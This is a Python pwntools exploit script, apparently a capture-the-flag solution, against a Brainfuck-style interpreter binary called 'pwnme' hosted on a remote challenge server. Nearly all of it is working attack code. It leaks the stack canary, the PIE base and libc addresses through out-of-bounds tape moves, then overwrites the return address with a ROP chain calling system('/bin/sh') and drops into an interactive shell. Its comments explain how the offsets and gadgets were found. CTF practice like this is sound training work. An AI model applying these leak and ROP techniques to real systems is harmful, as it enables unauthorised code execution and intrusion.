#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("pwnme_patched")
libc = ELF("./libc.so.6")

#b *bf+507
#b *bf+524
gs = '''
b *bf+507
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("0.cloud.chals.io", 31782)
    else:
        return process(elf.path)

# Plan: Fuzz the binary to find the offset

# In the picture we start printing from offset 64 and the first address we get out is 0x7fffffffdd88 and we
# can see that it is 24 bytes from the ret addr of bf(), the one which leads back to main.
# Leaking the ret add means that we have a PIE leak. Also, there are libc addresses on the stack that we will
# have to leak as well.
#p = ">"*64
#p += ".>"*62

# Step 2: Adjusting fuzzing payload. 64 + 24 = 88
#p = ">"*88
#p += ".>"*64
# Now we should be at the offset of the retn addr of bf() but I couln't understand why it was printing something like '!UUUUU'.
# So I looked at a hex to ascii table and found out that 'U' has the hex encoding 0x55. When the binary is compiled with pie
# and we run our script with GDB NOASLR the addresses will always be 0x55555555AABB where AABB is the offset of the individual
# instruction. For this reason it makes sense that we get something like '!UUUUU' since it is in little endian.

# Step 3: Leaking addr and calculating the offset.
# Since we know that the binary will always return to main+203 we can use this to calculate the base address and then use that
# to calculate everytinh else. In order to calculate the base address of the executable code in the binary we have to take the
# leaked retn addr and then subtract the known offset. The offset can be found using gdb: disassemble main (after loading the
# program and not running it). It can also be found using objdump -d pwnme_patched
# Main+203 has the offset: 0x1521
# The libc addr I mentioned earlier is the one 0x7ffff7c29d90 -> mov edi, eax. We can also see that this address is part of our
# leak. To verify that it indeed is part of libc, we can use a command in gdb: info sharedlibrary.
# Using this we can verify that it indeed is part of the libc.so.6 used by the binary. 
# From what I understand the 29d90 part of the libc addr is randomized every time, so we have to subtract 0x29d90 from the leaked
# addr to get the base of libc


# Addresses
libc_binsh = 0x1d8678 # Found using strings -a -t x libc.so.6 | grep "/bin/sh" 
libc_system = 0x50d70 # Found using objdump -d libc.so.6 | grep system
#print(libc.symbols['system']) also finds 0x50d70
libc_pop_rdi_ret = 0x2a3e5 # Found using ROPgadget --binary libc.so.6 | grep "pop rdi ; ret"
libc_pop_rax_ret = 0x45eb0
libc_leak_offset = 0x29d90
pwnme_ret_gadget = 0x101a


# Functions
def add_addr(address):
    return b"".join([b"+" * k + b">" for k in p64(address)])

def sub_addr(address):
    return b"".join([b"-" * k + b">" for k in p64(address)])
io = start()


# First run to leak addresses
p = ">"*72
p += ".>"*8 # canary
p += ">"*8  # rbp
p += ".>"*8 # ret addr
p += ".>"*32 # libc addr

io.recvuntil(b">")
io.sendline(p)
recv = io.recv()
print(recv)
canary = u64(recv[:7].strip().ljust(8, b"\x00"))
ret_leak = u64(recv[8:15].strip().ljust(8, b"\x00"))
ret_plus_one = u64(recv[16:23].strip().ljust(8, b"\x00"))
ret_plus_two = u64(recv[24:31].strip().ljust(8, b"\x00"))
ret_plus_three = u64(recv[32:40].strip().ljust(8, b"\x00"))
libc_leak = u64(recv[40:48].strip().ljust(8, b"\x00"))
pie_base = ret_leak - 0x1521

# Write leaks to terminal
log.info("canary leak: %s" % hex(canary))
log.info("ret leak: %s" % hex(ret_leak))
log.info("libc leak: %s" % hex(libc_leak))
log.info("pie base: %s" % hex(pie_base))
log.info("ret plus one: %s" % hex(ret_plus_one))
log.info("ret plus two: %s" % hex(ret_plus_two))
log.info("ret plus three: %s" % hex(ret_plus_three))

# Write libc base to terminal
libc_base = libc_leak - libc_leak_offset
log.info("libc base: %s" % hex(libc_base))

binsh = libc_base + libc_binsh
system = libc_base + libc_system
pop_rdi_ret = libc_base + libc_pop_rdi_ret
pop_rax_ret = libc_base + libc_pop_rax_ret
ret_gadget = pie_base + pwnme_ret_gadget
log.info("/bin/sh: %s" % hex(binsh))
log.info("system: %s" % hex(system))


p = b">"*88 + b">"*24
p += sub_addr(ret_plus_three) # we are at ret+3. Set it to 0
p += b"<"*8 # go back to start of ret+3
p += add_addr(pop_rdi_ret) # write pop_rdi_ret to ret+3

p += sub_addr(libc_leak)
p += b"<"*8
p += add_addr(binsh)

io.recvuntil(b">", timeout=2)
io.sendline(p)

# Second run to overwrite return address and build rop chain to pop shell
p = b">"*88 + b">"*40
p += sub_addr(0) # set ret+2 to 0
p += b"<"*8 # go back to start of ret+2
p += add_addr(system) # write pop_rdi gadget to it

io.recvuntil(b">", timeout=2)
io.sendline(p)

p = b">"*88 # get to ret addr
p += sub_addr(ret_leak) # set ret addr to 0
p += b"<"*8 # go back to start of ret addr
p += add_addr(pop_rax_ret) # write the address of pop_rdi gadget where ret was
p += b">"*8 # go past the ret+1 value since we don't care about it. Also, it varies from time to time and therefore we cannot use it
p += sub_addr(ret_plus_two) # set ret+2 to 0
p += b"<"*8
p += add_addr(ret_gadget) # add a ret gadget to jump to pop_rdi_ret

io.recvuntil(b">", timeout=2)
io.sendline(p)


io.interactive()
